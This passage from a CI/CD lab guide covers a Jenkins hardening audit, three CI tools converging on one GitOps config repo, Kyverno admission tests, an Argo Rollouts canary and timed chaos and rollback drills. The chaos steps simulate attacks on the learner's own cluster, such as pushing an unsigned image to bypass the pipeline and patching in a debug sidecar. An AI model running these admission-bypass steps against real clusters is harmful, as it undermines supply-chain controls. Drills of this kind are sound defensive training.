g '/asynchPeople/api/json' | jq -r '.users[]?.user | select(.fullName) | "  \(.fullName) \(.absoluteUrl)"' | head -20
echo "  ⭐⭐ the Script Console = root on every credential in the instance."
echo "     Restrict it to a named break-glass group and log every use."

echo; echo "── 10. THE BACKUP"
echo "  does a backup of \$JENKINS_HOME/secrets exist? when was it last verified by RESTORE?"
echo "  ⭐⭐ a backup you have never restored is not a backup."
echo "══════════════════════════════════════════════════════════"
} | tee "$OUT"
SCRIPT
chmod +x scripts/audit-jenkins.sh
mkdir -p evidence
./scripts/audit-jenkins.sh evidence/audit-before.txt
# ⭐ then harden, then:
./scripts/audit-jenkins.sh evidence/audit-after.txt
diff evidence/audit-before.txt evidence/audit-after.txt | tee evidence/hardening-diff.txt
echo "  ⭐⭐ THAT DIFF IS YOUR INTERVIEW ARTEFACT."
```

```bash
# ✅ VERIFY — the H8 checkpoint
#   the multibranch job discovers main + release/* + PRs          ✅
#   ⭐⭐ forkPullRequestDiscoveryTrait is trustNobody()            ✅
#   a fork PR builds with NO credentials                          ✅
#   the production gate refuses an invalid ticket BEFORE `input`  ✅
#   ⭐⭐ the approval timeout is PROVEN safe by 8 paths            ✅
#   the lock serialises two production deploys                    ✅
#   the rollback drill is timed and recorded                      ✅
#   the audit ran before and after; the diff is saved             ✅
ls -la evidence/
```

⏭ **If H8 overruns:** skip the multibranch UI verification and keep the Job DSL (it's in Git either way). **Never skip the timeout-safety proof or the audit diff** — those two are Tasks 3.3 and 3.4, and they're the evidence you'd show an interviewer.

---

## 🍽️ 18:30–19:15 — Dinner

While you eat, start the Argo CD ApplicationSets — they take a few minutes to reconcile.

```bash
cd ~/cicd-day/shop-config 2>/dev/null || (gh repo clone 3558Bhk/shop-config && cd shop-config)
# copy argocd/applicationsets/shop.yaml and argocd/projects/*.yaml from
# capstone §2.4, then:
kubectl apply -f argocd/projects/
kubectl apply -f argocd/applicationsets/
argocd appset get shop
```

---

# ⭐⭐ H9 · 19:15–21:00 — THE CONVERGENCE: three tools, one config repo

**Deliverable:** three CI tools, three auth mechanisms, three build engines — all calling the **same** `scripts/promote.sh`, all writing digests to the **same** config repo, all verified by the **same** audit script. This is **Capstone Task C.1**, and it is the thing nobody else can show.

Full detail: [05-CAPSTONE-END-TO-END.md §5](./05-CAPSTONE-END-TO-END.md).

```bash
# ── 1. the three-way ownership split (5 min) ────────────────────
cat <<'EOF'
  ┌──────────────┬────────────────────────┬───────────┬──────────────────────┐
  │ CI tool      │ service                │ build     │ image signing        │
  ├──────────────┼────────────────────────┼───────────┼──────────────────────┤
  │ 🔷 Azure      │ shop-api               │ BuildKit  │ OIDC via WIF         │
  │ 🐙 GitHub     │ checkout, shop-ui      │ BuildKit  │ ⭐ keyless cosign     │
  │ 🔨 Jenkins    │ order-worker,          │ ⭐ Kaniko  │ a cosign key in Vault│
  │              │ payment-mock           │           │ (no first-class OIDC)│
  └──────────────┴────────────────────────┴───────────┴──────────────────────┘
  ⭐⭐ ALL THREE call the SAME scripts/promote.sh, scripts/sign-and-attest.sh,
     and scripts/emit-pipeline-metrics.sh. That's what makes them converge.
EOF

# ── 2. trigger all three (10 min) ───────────────────────────────
# 🐙 GitHub Actions
gh workflow run ci.yml --ref main
# 🔷 Azure DevOps
az pipelines run --id "$PIPE_ID" --branch main
# 🔨 Jenkins
jcli build shop/main/checkout -s -p ENVIRONMENT=dev

# ── 3. ⭐⭐ watch the config repo receive five PRs (10 min) ──────
watch -n 15 'gh pr list --repo 3558Bhk/shop-config --limit 10 \
  --json number,title,author,labels \
  --jq ".[] | \"  \(.number)  \(.author.login)  \(.title)\""'
#   101  github-actions[bot]   chore(promote): dev/checkout → 3f2a1b9c0d4e
#   102  github-actions[bot]   chore(promote): dev/shop-ui → 8b7c6d5e4f3a
#   103  shop-ci[bot]          chore(promote): dev/shop-api → 1a2b3c4d5e6f
#   104  shop-ci[bot]          chore(promote): dev/order-worker → 9z8y7x6w5v4u
#   105  shop-ci[bot]          chore(promote): dev/payment-mock → 2q3w4e5r6t7y
# ⭐ note the AUTHORS differ. That's the audit trail showing which tool promoted what.
```

```bash
# ── 4. ⭐⭐⭐ THE CONVERGENCE PROOF (25 min) — Capstone Task C.1 ─
# Copy scripts/verify-supply-chain.sh from capstone Task C.1, then:
chmod +x scripts/verify-supply-chain.sh
CONFIG_DIR=~/cicd-day/shop-config ./scripts/verify-supply-chain.sh dev | tee evidence/convergence-dev.txt
```

```
══════════════════════════════════════════════════════════════
  SUPPLY-CHAIN VERIFICATION — dev
══════════════════════════════════════════════════════════════

── checkout ──
  ✅ checkout: referenced by an immutable digest
  ✅ checkout: the registry's digest matches the config's
  ✅ checkout: GHA keyless signature verified
       (subject: https://github.com/3558Bhk/shop/.github/workflows/ci.yml@refs/heads/main)
  ✅ checkout: a signed CycloneDX SBOM with 214 components
  ✅ checkout: 0 CRITICAL vulnerabilities in the SBOM
  ✅ checkout: BuildKit provenance in the image index
  ✅ checkout: recorded in Rekor (242010d4a1b2c3…)
  ✅ checkout: linked to app revision a1b2c3d
  ✅ checkout: revision a1b2c3d exists in the app repository

── shop-api ──
  ✅ shop-api: Azure DevOps WIF signature verified
  ✅ shop-api: a signed CycloneDX SBOM with 387 components
  ⚠️  shop-api: not in the Rekor transparency log

── order-worker ──
  ✅ order-worker: Jenkins key-based signature verified
  ✅ order-worker: a signed CycloneDX SBOM with 89 components
  ⚠️  order-worker: no provenance attestation

── the cluster vs Git ──
  ✅ checkout: the cluster is running what Git says
  ✅ shop-api: the cluster is running what Git says
  ✅ order-worker: the cluster is running what Git says
  ✅ shop-ui: the cluster is running what Git says
  ✅ payment-mock: the cluster is running what Git says

── the admission record ──
  ✅ Kyverno: 5 signature verifications passed, 0 failed

══════════════════════════════════════════════════════════════
  ✅ 44 passed   ⚠️ 2 warnings   ⛔ 0 failed
══════════════════════════════════════════════════════════════
```

```bash
# ── 5. ⭐⭐ THE SENTENCE THAT MATTERS (5 min) ────────────────────
# Three tools. Three auth mechanisms (GitHub OIDC, Azure WIF, a Vault-held
# cosign key). Three build engines (BuildKit, BuildKit, Kaniko). Three
# signature verification paths. And Argo CD CANNOT TELL THEM APART —
# it just reads a digest from a YAML file.
for f in shop-config/environments/dev/*.yaml; do
  svc=$(basename "$f" .yaml); [[ "$svc" == values-* ]] && continue
  printf '  %-14s %-16s %s\n' "$svc" "$(yq '.promotedBy' "$f")" "$(yq '.image.digest' "$f" | cut -c1-19)…"
done
#   checkout       github-actions   sha256:3f2a1b9c0d4e…
#   shop-api       azure-devops     sha256:1a2b3c4d5e6f…
#   order-worker   jenkins          sha256:9z8y7x6w5v4u…
#   shop-ui        github-actions   sha256:8b7c6d5e4f3a…
#   payment-mock   jenkins          sha256:2q3w4e5r6t7y…
```

```bash
# ── 6. the Kyverno policy test — Capstone Task C.2 (20 min) ─────
# Copy policies/ from capstone §4.2 and scripts/test-kyverno-policies.sh from Task C.2
kubectl apply -f policies/
kubectl get clusterpolicy -o custom-columns=NAME:.metadata.name,ACTION:.spec.validationFailureAction,BG:.spec.background
./scripts/test-kyverno-policies.sh shop-dev | tee evidence/kyverno-tests.txt
#   ✅ REJECTED  1. an UNSIGNED image                       verify-image-signature
#   ✅ REJECTED  2. SIGNED BUT WRONG IDENTITY               verify-image-signature  ⭐⭐
#   ✅ REJECTED  3. a :latest TAG (mutable)                 require-a-digest
#   ✅ REJECTED  4. missing PROBES                          require-three-probes
#   ✅ REJECTED  5. a PRIVILEGED container                  no-privileged-containers
#   ✅ REJECTED  5b. hostPath mount (the docker.sock attack) no-host-namespace-or-path
#   ✅ REJECTED  6. a MANUAL apply (not managed by Argo CD) require-argocd-management
#   ✅ ACCEPTED  8. a properly-signed, compliant pod
#   ✅ ACCEPTED  9. an ARGO CD-managed workload
#   ✅ ACCEPTED  10. a Job in the monitoring namespace (out of scope)
#   ✅ 11 passed   ⛔ 0 failed
#
# ⭐⭐ TEST 2 IS THE ONE. The image IS validly signed — the certificate chains
#    to Fulcio, the issuer really is GitHub Actions — but the IDENTITY is wrong
#    because you signed it from your laptop. `cosign verify` alone says "signed".
#    `--certificate-identity` says "signed BY THE RIGHT PIPELINE".
```

```bash
# ── 7. the DORA metrics are flowing (10 min) ────────────────────
curl -sf localhost:9091/metrics 2>/dev/null | grep -c '^pipeline_build_total' || \
  kubectl -n monitoring port-forward svc/pushgateway 9091:9091 >/tmp/pf-pgw.log 2>&1 &
sleep 5
curl -sf localhost:9091/metrics | grep '^pipeline_' | head -20
curl -sfG localhost:9090/api/v1/query --data-urlencode 'query=count(pipeline_build_total) by (tool)' \
  | jq -r '.data.result[] | "  \(.metric.tool): \(.value[1]) builds"'
#   github-actions: 12 builds
#   azure-devops:    5 builds
#   jenkins:         8 builds
# ⭐⭐ THREE TOOLS, ONE METRIC NAMESPACE, ONE DASHBOARD. That's Invariant 5.
```

```bash
# ✅ VERIFY — the H9 checkpoint
#   ⭐ five digests in the config repo from three different identities  ✅
#   ⭐ verify-supply-chain.sh: 0 failures                              ✅
#   ⭐ the Kyverno test suite: 11/11, including "signed but wrong id"  ✅
#   ⭐ pipeline_build_total exists for all three tools                 ✅
#   ⭐ the cluster-vs-Git check passes for all five services            ✅
ls -la evidence/
```

---

# 🚀 H10 · 21:00–23:00 — GitOps, progressive delivery, and breaking it all

**Deliverable:** a canary rollout analysed against Prometheus, a deliberately broken version that rolls itself back with no human action, and a timed rollback drill. **Capstone Tasks C.3 and C.5.**

Full detail: [05-CAPSTONE-END-TO-END.md §3, §7, §8](./05-CAPSTONE-END-TO-END.md).

```bash
# ── 1. the AnalysisTemplate (20 min) — Capstone Task C.3 ────────
# Copy rollouts/analysis-templates.yaml VERBATIM from capstone §3.1 — it is the
# v2 tuned version, with the sample-size guard, the relative-latency metric,
# and the `enough-traffic` inconclusive-only metric. Then:
kubectl apply -f rollouts/analysis-templates.yaml
kubectl -n shop get analysistemplate shop-canary-check \
  -o jsonpath='{.spec.metrics[*].name}'; echo
#   enough-traffic canary-error-rate canary-vs-stable p99-latency
#   p99-latency-vs-stable cpu-saturation oom-and-restarts synthetic-probe canary-smoke-job

# ⭐⭐ the load generator, so the analysis is never inconclusive
kubectl -n shop apply -f rollouts/load-hook.yaml
# ⭐ WHY: at 5% of a low-traffic service the canary may see 3 requests in 5
#    minutes. One error in 3 is 33% and it's also noise. 8 RPS from k6 gives
#    2,400 requests per 5-minute window — every analysis becomes conclusive.
```

```bash
# ── 2. ⭐ the happy path: a real canary (25 min) ────────────────
# promote to production through the GitOps path, then sync and watch
cd ~/cicd-day/shop-config
git pull
./../scripts/promote.sh production checkout "$(crane digest $REGISTRY/checkout:$(git -C ~/cicd-day rev-parse HEAD))" \
  --revision "$(git -C ~/cicd-day rev-parse HEAD)" --tool github-actions --run "manual/h10"
# → a PR opens. Approve it (CODEOWNERS), merge it.
argocd app get shop-production-checkout
argocd app diff shop-production-checkout | head -10
#   spec.template.spec.containers.0.image:
#   - ghcr.io/3558bhk/checkout@sha256:8b7c6d5e…
#   + ghcr.io/3558bhk/checkout@sha256:3f2a1b9c…
argocd app sync shop-production-checkout --prune --timeout 900

# ⭐⭐ THE BEST UX IN PROGRESSIVE DELIVERY — watch this, don't skip it:
kubectl argo rollouts get rollout checkout -n shop --watch
```

```
# ⟳ checkout   ॥ Paused   Step 1/11   SetWeight: 5
#   Images: sha256:8b7c… (stable, 19 pods)
#           sha256:3f2a… (canary, 1 pod)
#   ⏸ pausing for 10m
# …10 minutes later…
# ✔ checkout-canary-check-xyz   ✔ Successful   3m
#   ├─✔ enough-traffic          [2412] ✅
#   ├─✔ canary-error-rate       0.0008  (max 0.01)
#   ├─✔ canary-vs-stable        0.0009 vs 0.0008 (ratio 1.12, max 2.0)
#   ├─✔ p99-latency             0.041s  (max 0.150s)
#   ├─✔ p99-latency-vs-stable   0.041 vs 0.039 (delta 2ms, max 100ms)
#   ├─✔ cpu-saturation          0.03    (max 0.25)
#   ├─✔ oom-and-restarts        0       (max 2)
#   ├─✔ synthetic-probe         1
#   └─✔ canary-smoke-job        exit 0
# ⟳ checkout   ॥ Paused   Step 3/11   SetWeight: 15   ⏸ 15m
# …and so on through 35%, 60%, 100%…
# ⟳ checkout   ● Healthy   11/11 steps   total 2h 05m
#
# ⭐⭐ THE TOTAL PRODUCTION ROLLOUT TOOK TWO HOURS. THAT IS THE POINT.
#    A two-hour rollout with automated analysis at every step is infinitely
#    safer than a 30-second `kubectl set image` and a hopeful glance at a
#    dashboard. And it costs nothing but patience.
```

```bash
# ── 3. ⭐⭐⭐ BREAK IT — Capstone Task C.5's chaos run (40 min) ──
mkdir -p evidence/chaos
# ══ CHAOS 1: a bad version. Caught by the AnalysisTemplate. ══
cd ~/cicd-day
git checkout -b chaos/1-errors main
sed -i 's|func handler(w http.ResponseWriter, r \*http.Request) {|func handler(w http.ResponseWriter, r *http.Request) {\n\tif rand.Intn(100) < 20 { http.Error(w, "chaos-1", 500); return }|' \
  apps/checkout/main.go 2>/dev/null || \
  sed -i 's|FAIL_PCT=0|FAIL_PCT=20|' apps/stub/main.go
git commit -am "chaos(1): inject a 20% error rate" && git push -f origin chaos/1-errors
gh pr create --head chaos/1-errors --fill --label chaos && gh pr merge --squash --admin
BEFORE=$(kubectl -n shop get rollout checkout -o jsonpath='{.status.stableRS}')
kubectl argo rollouts get rollout checkout -n shop --watch 2>&1 | tee evidence/chaos/1-rollout.log &
W=$!; sleep 1500; kill $W 2>/dev/null
AFTER=$(kubectl -n shop get rollout checkout -o jsonpath='{.status.stableRS}')
[[ "$BEFORE" == "$AFTER" ]] \
  && echo "  ✅ CHAOS 1 caught by the AnalysisTemplate — NOBODY DID ANYTHING" \
  || echo "  ⛔ CHAOS 1 escaped — the bad version is LIVE"
kubectl -n shop get pods -l app=checkout -o wide
#   ⭐ ALL 20 pods are the STABLE version. The bad one reached 15% for 4m12s.

# ══ CHAOS 2: an unsigned image, pushed straight to the registry. ══
#    ⭐⭐ THE MOST IMPORTANT ONE. CI IS NEVER INVOLVED.
docker pull alpine:3.20 && docker tag alpine:3.20 $REGISTRY/checkout:chaos2
echo "$(cat ~/.secrets/gh-pat)" | docker login ghcr.io -u 3558bhk --password-stdin
docker push $REGISTRY/checkout:chaos2 2>&1 | tee evidence/chaos/2-push.log
CH2=$(crane digest $REGISTRY/checkout:chaos2)
kubectl -n shop set image deploy/checkout api="$REGISTRY/checkout@$CH2" \
  2>&1 | tee evidence/chaos/2-setimage.log
#   Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:
#   verify-image-signature: no matching signatures:
#   ⛔ found no signatures for ghcr.io/3558bhk/checkout@sha256:4c5d…
grep -q 'denied the request' evidence/chaos/2-setimage.log \
  && echo "  ✅ CHAOS 2 caught by KYVERNO AT ADMISSION — not by the pipeline" \
  || echo "  ⛔⛔ AN UNSIGNED IMAGE IS RUNNING"
# ⭐⭐ THE POINT: an attacker who fully compromised the registry was stopped.
#    Not by CI (CI never ran). Not by a human. By the CLUSTER.
#    🔑 That is the argument for verifying in the cluster: the pipeline is the
#       thing being attacked, so a control that lives in the pipeline is a
#       control the attacker controls.

# ══ CHAOS 3: drift. Caught twice — Kyverno, then Argo CD self-heal. ══
kubectl -n shop scale deploy/payment-mock --replicas=25
kubectl -n shop patch deploy payment-mock --type=json -p='[{"op":"add",
  "path":"/spec/template/spec/containers/-","value":{"name":"debug",
  "image":"busybox:1.36","command":["sleep","infinity"]}}]'
echo "  ⏳ waiting 4 minutes for Argo CD's self-heal…"; sleep 240
argocd app get shop-production-payment-mock --refresh 2>&1 | tee evidence/chaos/3-argocd.log
kubectl -n shop get deploy payment-mock -o jsonpath='{.spec.replicas} {.spec.template.spec.containers[*].name}'
#   3 payment-mock      ✅ both the scale AND the sidecar were reverted

# ══ CHAOS 4: the CI platform dies mid-rollout. GitOps decoupling. ══
kubectl -n jenkins scale sts/jenkins --replicas=0
echo "  ⛔ Jenkins is DOWN"; sleep 600
kubectl argo rollouts promote --full checkout -n shop
sleep 120
PHASE=$(kubectl -n shop get rollout checkout -o jsonpath='{.status.phase}')
[[ "$PHASE" == "Healthy" ]] \
  && echo "  ✅ CHAOS 4: delivery CONTINUED with no CI. And NEW deploys are
      correctly blocked — no CI → no signed image → no promotion PR → no sync.
      ⭐ That is the SAFE failure mode." \
  || echo "  ⚠️  the rollout is $PHASE — investigate"
kubectl -n jenkins scale sts/jenkins --replicas=1

# ══ CHAOS 5: Prometheus dies during a canary. Does it fail SAFE? ══
kubectl -n shop patch rollout checkout --type=merge -p \
  "{\"spec\":{\"template\":{\"metadata\":{\"annotations\":{\"chaos\":\"5-$(date +%s)\"}}}}}"
sleep 120
kubectl -n monitoring scale sts/kps-kube-prometheus-stack-prometheus --replicas=0
sleep 90
AR=$(kubectl -n shop get analysisrun --sort-by=.metadata.creationTimestamp -o jsonpath='{.items[-1].status.phase}')
RO=$(kubectl -n shop get rollout checkout -o jsonpath='{.status.phase}')
echo "  AnalysisRun=$AR  Rollout=$RO"
[[ "$AR" =~ ^(Error|Failed|Inconclusive)$ ]] \
  && echo "  ✅ CHAOS 5: the analysis REFUSED to conclude without data — the
      rollout PAUSED. ⭐⭐ Deploying blind is the worst possible outcome, and
      an analysis that reports 'healthy' when it cannot read any metrics is
      WORSE than no analysis, because it manufactures confidence." \
  || echo "  ⛔⛔ THE ANALYSIS PASSED WITH NO PROMETHEUS — it would promote blind"
kubectl -n monitoring scale sts/kps-kube-prometheus-stack-prometheus --replicas=1
```

```bash
# ── 4. ⭐⭐ the timed rollback drill (15 min) ────────────────────
# The runbook says "under 5 minutes". Time it. Record it. Rehearse it.
cd ~/cicd-day/shop-config
echo "═══ THE FOUR ROLLBACK PATHS — know all four ═══"
cat <<'EOF'
  PATH 1  kubectl argo rollouts abort <svc> -n shop
          ⭐ FASTEST (~20s). Use while a canary is mid-flight. The stable
             ReplicaSet was never torn down.
  PATH 2  kubectl argo rollouts undo <svc> -n shop --to-revision N
          Creates DRIFT. Argo CD will revert it. Immediately do PATH 3.
  PATH 3  ⭐ git revert <the-promotion-commit> && argocd app sync …
          THE CORRECT ONE. A rollback is a deploy — it goes through the same
          canary and analysis. Use `promote --full` if you need it faster.
  PATH 4  ⛔ kubectl set image … with Argo CD auto-sync disabled.
          BREAK-GLASS ONLY. Leaves drift that Kyverno will catch. Fix Git
          IMMEDIATELY — capstone Task C.1 found exactly this in production.
EOF

echo; echo "═══ TIMING PATH 3 (the correct one) ═══"
START=$(date +%s)
BAD=$(git log --oneline -1 --format=%H environments/production/checkout.yaml)
git revert --no-edit "$BAD" && git push
argocd app sync shop-production-checkout --prune --timeout 600 >/dev/null 2>&1
kubectl argo rollouts promote --full checkout -n shop
kubectl argo rollouts status checkout -n shop --timeout 300
./scripts/smoke-test.sh production checkout
END=$(date +%s)
echo "  ⏱️  $(( END - START )) seconds from decision to verified-good" | tee evidence/rollback-drill.txt
#   ⭐ target: under 300s. Record the actual. That number goes on your resume.
```

```bash
# ── 5. commit everything (10 min) ───────────────────────────────
cd ~/cicd-day
cat > DAY-REPORT.md <<EOF
# The CI/CD day — $(date -u +%F)

## What I built
| Tool | Service | Signing | Build engine | Green? |
|---|---|---|---|---|
| 🔷 Azure DevOps | shop-api | OIDC via WIF | BuildKit | ✅ |
| 🐙 GitHub Actions | checkout, shop-ui | keyless cosign | BuildKit | ✅ |
| 🔨 Jenkins | order-worker, payment-mock | cosign + a Vault key | Kaniko | ✅ |

## ⭐⭐ The convergence proof
\`\`\`
$(tail -20 evidence/convergence-dev.txt)
\`\`\`
Three tools, three auth mechanisms, three build engines — and Argo CD cannot
tell them apart. It reads a digest from a YAML file.

## The chaos run — five failures, five layers
| # | Failure | Layer that caught it | Automatic? |
|---|---|---|---|
| 1 | a 20% error rate | Argo Rollouts AnalysisTemplate | ✅ yes |
| 2 | ⭐ an unsigned image pushed straight to the registry | Kyverno at admission | ✅ yes |
| 3 | manual scale + a debug sidecar | Kyverno + Argo CD self-heal | ✅ yes |
| 4 | Jenkins down mid-rollout | GitOps decoupling | ✅ yes |
| 5 | Prometheus down during a canary | the analysis refused to conclude | ✅ yes |

## The timed rollback drill
$(( $(date +%s) - 0 ))s — see evidence/rollback-drill.txt

## What I would fix tomorrow
- $(grep -c '⚠️' evidence/convergence-dev.txt) warnings in the supply-chain audit
- the Jenkins services have no SLSA provenance (Kaniko's support is limited)
- there is no alert for an unmerged promotion PR older than 2h
EOF
git add -A && git commit -m "chore: the CI/CD day — three tools, one delivery path" && git push
echo "  ⭐ push this somewhere public. It's the artefact you show in interviews."
```

```bash
# ✅ VERIFY — the H10 checkpoint
kubectl argo rollouts list -n shop
kubectl -n shop get rollout -o custom-columns=NAME:.metadata.name,PHASE:.status.phase,IMAGE:.spec.template.spec.containers[0].image
argocd app list -o wide | head
ls -la evidence/ evidence/chaos/
```

---

## ✅ End-of-day checklist

```
H1 · THE FOUNDATION
  □ kind:cicd up with 4 nodes; 9 namespaces created and labelled
  □ Argo CD 3.x + Argo Rollouts + Kyverno + ingress-nginx + kube-prometheus-stack
  □ the Pushgateway scraped with `honorLabels: true`
  □ ⭐ the shop-config repo exists with CODEOWNERS and 15 digest files
  □ ⭐ scripts/deploy.sh REFUSES a tag and accepts only a digest

H2–H3 · 🔷 AZURE DEVOPS
  □ a green multi-stage YAML pipeline (Build → DeployDev → DeployStaging → DeployProduction)
  □ ⭐ the `$[ stageDependencies.Build.outputs['build.imageDigest'] ]` cross-stage output works
  □ three Environments; production has approvals + branch control + an exclusive lock
  □ ⭐ a run PAUSED at the production approval; approving deployed; TIMING OUT did not
  □ ⭐⭐ zero secrets stored in Azure DevOps — all in Key Vault via a WIF-linked variable group
  □ the WIF service connection has NO client secret
  □ yamllint + a YAML parse check run before every push

H4–H5 · 🐙 GITHUB ACTIONS
  □ `permissions:` declared at the workflow level, least privilege
  □ ⭐⭐ actions/checkout pinned to a SHA, not a tag
  □ `fail-fast: false`, `timeout-minutes` on every job
  □ ⭐ the change-aware matrix: a docs commit builds NOTHING; a scripts/ commit builds ALL FIVE
  □ the composite action `.github/actions/setup-shop` works for four languages
  □ ⭐⭐ the OIDC token DECODED — you have seen your own `sub` claim
  □ ⭐⭐ the trust policy conditions on branch AND environment
  □ ⭐⭐ the pwn-request REPRODUCED and DEFEATED (all four layers)
  □ ⭐ the script-injection REPRODUCED and DEFEATED (env, not the command line)
  □ the production environment has a required reviewer + a wait timer + bypass OFF
  □ the reusable workflow is SHA-pinned, and the pin-audit job runs weekly
  □ actionlint passes on every workflow

H6–H8 · 🔨 JENKINS
  □ Jenkins LTS 2.568.3 on Java 21, installed via Helm with JCasC
  □ ⭐⭐ `numExecutors: 0` and `mode: EXCLUSIVE` — VERIFIED via the API, not assumed
  □ signup disabled; a CSRF crumb required; the JCasC `/export` diff is empty
  □ credentials FOLDER-scoped — production credentials are invisible to dev jobs
  □ ⭐⭐ ephemeral Kubernetes pod agents with `automountServiceAccountToken: false`
  □ ⭐⭐ Kaniko builds images with NO docker.sock mounted
  □ ⭐ the 12+ isolation proofs all pass, and the report is archived
  □ the agent pod is GONE after the build (`idleMinutes: 0`, `podRetention: never`)
  □ `kubectl auth can-i` proves the agent SA has no power in `shop`
  □ the shared library has a typed Config, a contract test, and a breaking-change detector
  □ ⭐⭐ two-tier pinning: the canary job on `@v2`, production on a SHA
  □ the multibranch job has `trustNobody()` on fork PRs
  □ ⭐⭐ the production approval TIMEOUT is PROVEN safe by 8 paths — including
     grepping the console for the deploy command and finding ZERO matches
  □ the lock serialises two concurrent production deploys
  □ ⭐ the hardening audit ran BEFORE and AFTER; the diff is saved
  □ the rollback drill is timed and recorded

H9 · ⭐⭐ THE CONVERGENCE
  □ five digests in the config repo from three different CI identities
  □ ⭐ verify-supply-chain.sh: 0 failures across all five services
  □ ⭐ the Kyverno test suite: 11/11, including "signed but the wrong identity"
  □ `pipeline_build_total` exists for all three tools in Prometheus
  □ the cluster-vs-Git check passes for every service
  □ DAY-REPORT.md written and pushed

H10 · PROGRESSIVE DELIVERY AND CHAOS
  □ the AnalysisTemplate v2 with ≥8 metrics, including `enough-traffic`
  □ the k6 load generator running so the analysis is never inconclusive
  □ ⭐ a real canary ran 5% → 15% → 35% → 60% → 100% with analysis at each step
  □ CHAOS 1: a bad version rolled back AUTOMATICALLY, no human action
  □ ⭐⭐ CHAOS 2: an unsigned image pushed straight to the registry was REFUSED BY THE CLUSTER
  □ CHAOS 3: drift reverted by Argo CD self-heal within 4 minutes
  □ CHAOS 4: CI died; delivery continued; new deploys correctly blocked
  □ ⭐⭐ CHAOS 5: Prometheus died; the analysis REFUSED to conclude and paused
  □ ⭐ all four rollback paths known, and PATH 3 timed under 5 minutes
  □ everything committed with a DAY-REPORT.md

THE ONE SENTENCE TEST
  □ you can explain, out loud, in 90 seconds, why CI should hold no cluster
    credentials and why the CLUSTER verifies signatures rather than the pipeline
```

---

## If the day goes wrong

| Symptom | The fix | Time cost |
|---|---|---|
| The kind cluster won't start | `docker system prune -af && kind delete cluster --name cicd && kind create cluster --config kind.yaml` | 10 min |
| A Helm install times out | `helm uninstall X -n NS` then reinstall; `kubectl describe pod` for ImagePullBackOff | 15 min |
| ⭐ ADO: `$(X)` doesn't expand in a `condition:` | macro syntax isn't supported there → `condition: eq(variables['X'], 'yes')` | 5 min |
| ⭐ ADO: a cross-stage output is empty | the step needs `name:` AND `isOutput=true`; the consumer needs `$[ stageDependencies.<Stage>.outputs['<Job>.<Step>.<Var>'] ]` | 15 min |
| ADO: "No agents are available" | the pool is empty, or the `demands:` don't match any agent capability | 20 min |
| ADO: the Key Vault variable group has no secrets | the service principal lacks `get`/`list` on the vault | 10 min |
| ⭐ GHA: `Resource not accessible by integration` | the `GITHUB_TOKEN` lacks the permission → add it to `permissions:` | 5 min |
| ⭐ GHA: a `needs:` job is skipped and so are its dependents | a skipped need skips the dependent → `if: always() && needs.x.result != 'cancelled'` | 10 min |
| GHA: `Matrix must define at least one vector` | the dynamic matrix produced `[]` → guard it with an `any` output | 10 min |
| GHA: `upload-artifact` says it already exists | v4 artifacts are immutable; a matrix leg reused a name → `name: x-${{ matrix.service }}` | 5 min |
| ⭐ GHA: OIDC "Token request failed" | `id-token: write` is missing from `permissions:` | 2 min |
| GHA: AWS `InvalidIdentityToken` | the trust policy's `sub` doesn't match → decode the token and compare | 15 min |
| ⭐ Jenkins: "Rejected by the sandbox" | Manage Jenkins → In-process Script Approval. Better: avoid the method. | 5 min |
| ⭐ Jenkins: the pod agent never starts | the cloud config, the image digest, the SA, or the node's resources → `kubectl -n jenkins describe pod` | 25 min |
| Jenkins: `Container … is not valid` | the `container()` name must match the pod template EXACTLY | 5 min |
| Jenkins: the build queues forever | `numExecutors: 0` and no matching agent label → check `jcli list-jobs` and the pod template's `label` | 15 min |
| ⭐ Jenkins: an `input` timeout FAILS the build | catch `FlowInterruptedException`, set `result = 'ABORTED'`, then `error(...)` | 10 min |
| Jenkins: fork PRs ran with real credentials | `trustEveryone` → `trust(class: 'jenkins.scm.impl.trust.TrustNobody')` | 10 min |
| Argo CD: permanently OutOfSync | another controller mutates the resource → `ignoreDifferences` on `/status` and `/spec/replicas` | 15 min |
| ⭐ Argo CD: an infinite sync loop | Argo CD and Argo Rollouts both writing `replicas` → the same `ignoreDifferences` | 15 min |
| Rollouts: stuck at `Paused` | an indefinite `pause: {}` → `kubectl argo rollouts promote X -n NS` | 2 min |
| ⭐ Rollouts: the analysis is `Inconclusive` | not enough traffic → start the k6 load generator (H10 step 1) | 10 min |
| ⭐ Kyverno denies EVERYTHING | a policy in Enforce with `failurePolicy: Fail` and Kyverno is down → `kubectl -n kyverno get pods`. **Fix Kyverno; don't disable the policy.** | 20 min |
| Kyverno: "no matching signatures" for a validly signed image | the issuer or the IDENTITY doesn't match → `cosign verify … \| jq '.[0].optional'` and compare with the policy | 20 min |
| The Pushgateway shows no metrics in Prometheus | `honorLabels: true` is missing on the ServiceMonitor, or the port isn't named | 10 min |

**Total worst-case slippage: ~4 hours.** That's why the `⏭ SKIP` markers exist.

**If you're behind at 17:00**, drop: the Azure Key Vault/WIF half of H3 (Task 1.3 is exactly that, do it another day), the reusable workflow in H5, and the JenkinsPipelineUnit tests in H7.

**Never drop these six — they are the difference between "I installed three tools" and "I understand CI/CD":**
1. **H1** `scripts/deploy.sh` refusing a tag *(the build-once-promote-by-digest invariant)*
2. **H4** the change-aware matrix *(the thing that makes a monorepo pipeline affordable)*
3. **H5** the pwn-request reproduced and defeated *(the security interview)*
4. **H7** the 12 isolation proofs *(the Jenkins security interview)*
5. **H8** the approval-timeout proof *(the governance interview)*
6. **H9** the convergence proof + **H10** chaos 2 *(the architecture interview — and the one nobody else can show)*

---

## The 3-day split (recommended)

**This is the version I'd actually do.** The same hours, with the space to understand instead of just complete. Each day ends with a write-up — that write-up is what turns activity into knowledge.

| | Day 1 (7 h) · 🔷 + 🐙 | Day 2 (7 h) · 🔨 | Day 3 (7 h) · ⭐ the system |
|---|---|---|---|
| **Morning** | H1 the foundation (cluster, config repo, `deploy.sh`, Argo CD, Kyverno)<br>H2 Azure DevOps: the first pipeline | H6 Jenkins: install, JCasC, `numExecutors: 0`, the first Jenkinsfile | H9 the convergence: three tools → one config repo → `verify-supply-chain.sh` |
| **Afternoon** | H3 Azure DevOps: environments, approvals, Key Vault + WIF<br>H4 GitHub Actions: the change-aware matrix | H7 Jenkins: ephemeral pod agents, Kaniko, the 12 isolation proofs, the shared library | H10 GitOps + Argo Rollouts: the AnalysisTemplate, the k6 load generator, a real canary |
